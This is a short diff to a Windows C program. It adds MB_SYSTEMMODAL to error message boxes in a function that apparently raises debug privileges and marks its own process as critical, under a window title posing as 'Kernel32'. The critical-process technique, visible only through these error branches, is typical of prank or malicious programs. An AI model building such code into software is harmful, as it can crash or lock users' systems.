@@ -21,14 +21,14 @@ int set_critical() {
 
 		if (ntReturnValue)
 		{
-			MessageBoxW(NULL, L"I cannot adjust my debug privileges...", L"Kernel32", MB_OK | MB_ICONERROR);
+			MessageBoxW(NULL, L"I cannot adjust my debug privileges...", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 
 			return FALSE;
 		}
 	}
 	else
 	{
-		MessageBoxW(NULL, L"I cannot find RtlAdjustPrivilege.\nWTF is this?", L"Kernel32", MB_OK | MB_ICONERROR);
+		MessageBoxW(NULL, L"I cannot find RtlAdjustPrivilege.\nWTF is this?", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 
 		return FALSE;
 	}
@@ -40,14 +40,14 @@ int set_critical() {
 
 		if (ntReturnValue)
 		{
-			MessageBoxW(NULL, L"It is not letting me become a critical process.\nThis is not fair!", L"Kernel32", MB_OK | MB_ICONERROR);
+			MessageBoxW(NULL, L"It is not letting me become a critical process.\nThis is not fair!", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 
 			return FALSE;
 		}
 	}
 	else
 	{
-		MessageBoxW(NULL, L"I cannot find RtlSetProcessIsCritical.\nDo you know where it is?", L"Kernel32", MB_OK | MB_ICONERROR);
+		MessageBoxW(NULL, L"I cannot find RtlSetProcessIsCritical.\nDo you know where it is?", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 
 		return FALSE;
 	}
@@ -64,6 +64,7 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 	return 0;
 
 }
+
 
 
 
